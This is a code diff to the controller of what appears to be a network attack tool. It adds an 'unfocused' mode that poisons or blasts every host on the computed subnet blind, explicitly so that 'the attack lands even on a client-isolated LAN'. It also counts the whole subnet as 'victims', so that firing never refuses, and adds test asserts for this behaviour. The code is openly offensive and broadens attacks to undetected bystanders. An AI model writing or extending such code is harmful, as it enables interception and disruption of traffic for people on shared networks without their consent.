@@ -338,6 +338,14 @@ class AppController:
             self._emission.add_transmitter(
                 self.managed_iface, self.net, our_mac=our_mac,
                 net_id=self._attention_net_id())
+            # UNFOCUSED = blast the WHOLE computed subnet blind (vanilla-style),
+            # so the attack lands even on a client-isolated LAN where smell sees
+            # almost nothing. FOCUSED stays limited to the owner's picks.
+            if not focused and self.net is not None:
+                self._emission.set_whole_subnet_blind(
+                    self.net.subnet_cidr,
+                    our_ip=self.net.device_ip or "",
+                    gw_ip=self.net.gateway_ipv4 or "")
             self._emission.start()  # also starts its own 100 ms rehydrator
 
             # feed the sniffer-sourced escaped-envelope counts into that rehydrator
@@ -426,13 +434,15 @@ class AppController:
             rows = self.arbiter.read(
                 DB_ATTENTION, "SELECT mac FROM attention WHERE mac != ?", (gw_mac,))
             return len(rows)
-        # unfocused: seed every smelled host. This is a one-shot at FIRE (not a hot
-        # path), so use a synchronous write — the attention set is then immediately
-        # correct for the emitter, the count display and the selected() readback.
+        # unfocused: seed every smelled host so identified ones carry a real MAC
+        # (cleaner unicast victim-poison) and the bird can hone them. The WHOLE
+        # subnet is additionally blasted BLIND by the emission pump
+        # (set_whole_subnet_blind in fire()), so the attack lands even on a
+        # client-isolated LAN where smell sees almost nothing. Synchronous write
+        # (one-shot at FIRE, not a hot path).
         rows = self.arbiter.read(
             DB_KNOWN_SCENTS,
             "SELECT mac, ip FROM scents WHERE mac != '' AND ip != ''")
-        victims = 0
         for mac, ip in rows:
             if ip in (our_ip, gw_ip) or mac == gw_mac:
                 continue
@@ -440,8 +450,23 @@ class AppController:
                 DB_ATTENTION,
                 "INSERT OR IGNORE INTO attention(mac, ip, net_id, weight, pinned) "
                 "VALUES(?,?,?,1.0,0)", (mac, ip, net_id))
-            victims += 1
-        return victims
+        # Target count = the whole subnet (blind blast), so FIRE never refuses
+        # while associated even if nothing was smelled. Fall back to the smelled
+        # count if the subnet CIDR is unknown.
+        return self._subnet_host_count(our_ip, gw_ip) or len(rows)
+
+    def _subnet_host_count(self, our_ip: str, gw_ip: str) -> int:
+        cidr = self.net.subnet_cidr if self.net else ""
+        if not cidr:
+            return 0
+        try:
+            import ipaddress
+            net = ipaddress.ip_network(cidr, strict=False)
+            excl = {our_ip, gw_ip,
+                    str(net.network_address), str(net.broadcast_address)}
+            return sum(1 for h in net.hosts() if str(h) not in excl)
+        except ValueError:
+            return 0
 
     # -- live-gauge survival monitor ----------------------------------------
     def _iface_mac(self, iface: str) -> str:
@@ -584,8 +609,10 @@ if __name__ == "__main__":
     _f.NetFetcher = _FakeNetFetcher
 
     class _FakeEmission:
-        def __init__(self, *a, **k): self._rehydrator = None
+        def __init__(self, *a, **k): self._rehydrator = None; self.blind = None
         def add_transmitter(self, *a, **k): pass
+        def set_whole_subnet_blind(self, cidr, our_ip="", gw_ip=""):
+            self.blind = cidr; return 0
         def start(self): pass
         def stop(self): pass
     class _FakeBird:
@@ -643,6 +670,7 @@ if __name__ == "__main__":
     assert ctl.knobs.emit_mode == EmitMode.FOCUSED, "emit always per-host so bird hones"
     victims = [r["mac"] for r in ctl.selected() if r["mac"] != "aa:bb:cc:00:00:01"]
     assert len(victims) == 3, victims
+    assert ctl._emission.blind == "192.168.1.0/24", "unfocused must blast whole subnet blind"
     ctl.cease()
     assert ctl.mode == Mode.LOCKED
 
@@ -652,6 +680,7 @@ if __name__ == "__main__":
     assert ctl.fire(focused=True) is True
     victims = [r["mac"] for r in ctl.selected() if r["mac"] != "aa:bb:cc:00:00:01"]
     assert victims == ["de:ad:00:00:00:01"], victims
+    assert ctl._emission.blind is None, "focused must NOT blast the whole subnet"
     ctl.cease()
 
     # 7) FOCUSED with no picks is refused (nothing to aim at)
